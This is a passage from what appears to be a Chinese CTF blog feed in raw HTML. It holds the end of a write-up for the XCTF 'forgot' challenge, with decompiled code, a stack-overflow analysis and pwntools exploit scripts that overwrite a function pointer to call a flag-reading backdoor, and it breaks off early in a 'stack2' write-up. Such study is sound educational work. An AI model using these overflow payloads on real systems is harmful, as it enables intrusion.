punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+78h] [ebp-Ch]</span>  size_t i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+7Ch] [ebp-8h]</span>  v14 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  fun1 <span class="token operator">=</span> sub_8048604<span class="token punctuation">;</span>  #将函数地址赋值给指针  fun2 <span class="token operator">=</span> sub_8048618<span class="token punctuation">;</span>  fun3 <span class="token operator">=</span> sub_804862C<span class="token punctuation">;</span>  v6 <span class="token operator">=</span> sub_8048640<span class="token punctuation">;</span>  v7 <span class="token operator">=</span> sub_8048654<span class="token punctuation">;</span>  v8 <span class="token operator">=</span> sub_8048668<span class="token punctuation">;</span>  v9 <span class="token operator">=</span> sub_804867C<span class="token punctuation">;</span>  v10 <span class="token operator">=</span> sub_8048690<span class="token punctuation">;</span>  v11 <span class="token operator">=</span> sub_80486A4<span class="token punctuation">;</span>  v12 <span class="token operator">=</span> sub_80486B8<span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter the string to be validate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>   #溢出点函数，没有限制输入的大小   <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v0 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v14 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048702</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>   #里面的函数是来对单个字符进行判别的，比较复杂，但是能搞懂逻辑顺序。          v14 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'@'</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_804874C</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别          v14 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>         #里面的函数是来对单个字符进行判别          v14 <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>                v14 <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sub_8048784</span><span class="token punctuation">(</span>v2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>          v14 <span class="token operator">=</span> <span class="token number">9</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9</span><span class="token punctuation">:</span>        v14 <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>fun1 <span class="token operator">+</span> <span class="token operator">--</span>v14<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #跳转到指针数组指向特定函数  main函数之外：  后门，这个函数名和前面的混在一起我一开始都没找到  <span class="token keyword">int</span> <span class="token function">sub_80486CC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Eh] [ebp-3Ah]</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">,</span> <span class="token string">"cat %s"</span><span class="token punctuation">,</span> <span class="token string">"./flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>snprintf函数收录</p><h2 id="3：分析"><a href="#3：分析" class="headerlink" title="3：分析"></a>3：分析</h2><p>首先由于存在栈溢出，且数组v2下面的都是函数指针那我们就可以控制fun1<del>fun3，以及v6</del>v12的函数指针，还有v14。<br>有后门，那么我们只要想到如何控制程序流程跳转到后门即可。<br>在for循环语句中，会根据数组v2中的字符来改变v14的大小，跳出循环后到这个语句：(*(&amp;fun1 + –v14))() 显然是执行指针所指向的函数。整个过程&amp;fun1不变，变的只有v14那么我们可以设计payload使得v14的变化在我们可以预测。那么就要好好分析switch case中的语句。<br>我们进入第一个判断函数sub_8048702：</p><pre><code>_BOOL4 __cdecl sub_8048702(char a1){  return a1 &gt; &#39;`&#39; &amp;&amp; a1 &lt;= &#39;z&#39; || a1 &gt; &#39;/&#39; &amp;&amp; a1 &lt;= &#39;9&#39; || a1 == &#39;_&#39; || a1 == &#39;-&#39; || a1 == &#39;+&#39; || a1 == &#39;.&#39;;// A~Z ：65~90   \xcc\x86\x04\x08}</code></pre><p>说实话第一眼看到这个鬼东西我是真的不想去分析它的逻辑，但是没办法，做生意又不会做。<br>&amp;&amp;  的优先级比 ||高  俩个都是从左到右。第一个&amp;&amp;最先计算，第一个||是最后运算，第二个&amp;&amp;第二运算  其他|| 从左到右。<br>因为第二个||是最后运算的，所以第一个&amp;&amp;运算结果是1那整体就是1. 为了不使v14有过多改变我们想办法构造的输入使这个整体为0.<br>发现没有对大写字母的判断所以padding可以用A。<br>仔细观察下面的判断，结合第一个判断我们知道只要payload里面没有@，v14就不可能大于3.<strong>所以程序流程只能最后执行&amp;fun1上面的函数，或是&amp;fun1+1上面的函数，这里需要对&amp;fun1+1和fun+1说明一下</strong></p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>    fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> main<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>fp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果</p><pre class=" language-bash"><code class="language-bash">000000000040153000000000004015318000000000062FDD0000000000062FDD8000000000062FDD8</code></pre><p>fp是一个指针放入了main函数的地址。我们直接输出fp时输出了它的值，也就是main函数地址，对其+1再输出可以看到其输出也仅仅是+1（数值+1）<br>不过我输出fp的地址&amp;fp，再输出其地址+1的结果，可以看到变动了0x8，也恰好等于下一个指针的地址。并不是简单+1。<strong>所以对于地址（&amp;取地址，操作目标是地址）那就是正真的地址+1到下一个地址。</strong><br><strong>回到&amp;fun+1 那么这将指向下一个函数，即fun2 = sub_8048618。</strong></p><p>所以我们要么覆盖fun1，要么覆盖fun2.用后门地址<br>payload = ‘A’*0x24 + p32(0x080486CC)<br>这里我打算覆盖到fun2，因为p32(0x080486CC)（这个东西经过判断函数后是会让v14变成2的,反正我当时是这么想的)</p><pre class=" language-bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> p32<span class="token punctuation">(</span>0x080486CC<span class="token punctuation">)</span> <span class="token string">'\xcc\x86\x04\x08'</span><span class="token operator">>></span><span class="token operator">></span></code></pre><p>自己写一个一模一样的判断函数然后输入这一串字符你就会发现会使if成立。然后v14==2 并且一直等于2 </p><p>那么(*(&amp;fun1 + –v14))() 就会指向fun2.</p><h2 id="4：EXP"><a href="#4：EXP" class="headerlink" title="4：EXP"></a>4：EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x080486cc door</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">36</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong><em>但是很可惜，我的分析又是错的（日了狗了，很操蛋）</em></strong></p><h2 id="5：探究"><a href="#5：探究" class="headerlink" title="5：探究"></a>5：探究</h2><p>我觉的思路绝对没问题，折腾了好久发现问题出在pwntools上。<br>看看我的一个程序：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> a1<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'\x00'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span>a1<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">96</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token number">122</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'/'</span> <span class="token operator">&amp;&amp;</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'9'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'_'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'-'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'+'</span> <span class="token operator">||</span> a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"work!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>没错我会输入<span class="token function">p32</span><span class="token punctuation">(</span><span class="token number">0x080486CC</span><span class="token punctuation">)</span>具体内容，然后看看到底会判断结果是什么</code></pre><pre class=" language-bash"><code class="language-bash">In <span class="token punctuation">[</span>4<span class="token punctuation">]</span>: payloadOut<span class="token punctuation">[</span>4<span class="token punctuation">]</span>: <span class="token string">'\xcc\x86\x04\x08'</span></code></pre><p>首先我直接输入\xcc\x86\x04\x08：<br><img src="https://s1.ax1x.com/2020/07/16/UrhfSI.png" alt=""><br>发现确实如我上面所说，会判断为正确（work）</p><p>但是我用脚本执行并输入：<br><img src="https://s1.ax1x.com/2020/07/16/Urh46P.png" alt=""><br>并没有通过判断！！！！<br><strong>看来 用pyhton-pwntools 输入与人工输入是有区别的</strong>。再来看一个：<br><img src="https://s1.ax1x.com/2020/07/16/Urhhlt.png" alt=""><br>这是我第一次想到的脚本，你会发现36个A后面的东西很奇怪，尤其是第一个\还带~的，这些问题有待考究。</p><p>因为p32(0x080486cc)用pwntools输入并不会通过判断所以最终的EXP是：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40479)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./forgot'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'yh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x080486cc door</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">32</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x080486cc</span><span class="token punctuation">)</span><span class="token keyword">print</span> payload<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>结果：</p><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0x29 bytes:    00000000  63 61 74 3a  20 2e 2f 66  6c 61 67 3a  20 e6 b2 a1  │cat:│ ./f│lag:│ ···│    00000010  e6 9c 89 e9  82 a3 e4 b8  aa e6 96 87  e4 bb b6 e6  │····│····│····│····│    00000020  88 96 e7 9b  ae e5 bd 95  0a                        │····│····│·│    00000029cat: ./flag: 没有那个文件或目录<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Process <span class="token string">'./forgot'</span> stopped with <span class="token keyword">exit</span> code 0 <span class="token punctuation">(</span>pid 47704<span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  一句话：虽然很操蛋，但是通过自己死磕搞懂了还是挺爽的。</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-challege </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-challenge-stack2</title>
      <link href="/2020/07/15/xctf-challenge-stack2/"/>
      <url>/2020/07/15/xctf-challenge-stack2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_challenge/stack2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>开启NX与Canary</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+18h] [ebp-90h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-8Ch]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+20h] [ebp-88h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-84h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+28h] [ebp-80h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-7Ch]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-78h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-74h]</span>  <span class="token keyword">char</span> v13<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+38h] [ebp-70h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+9Ch] [ebp-Ch]</span>  v14 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*                      An easy calc                       *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*Give me your numbers and I will return to you an average *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"*(0 &lt;= x &lt; 256)                                           *"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"***********************************************************"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"How many numbers you have:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your numbers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i <span class="token operator">&lt;=</span> <span class="token number">99</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>    v13<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> v5<span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"average is %.2lf\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">double</span><span class="token punctuation">)</span>v9 <span class="token operator">/</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Give me your number"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> j <span class="token operator">&lt;=</span> <span class="token number">0x63</span> <span class="token punctuation">)</span>          <span class="token punctuation">{</span>            v3 <span class="token operator">=</span> j<span class="token operator">++</span><span class="token punctuation">;</span>            v13<span class="token punctuation">[</span>v3<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v6 <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token function">puts</span><span class="token 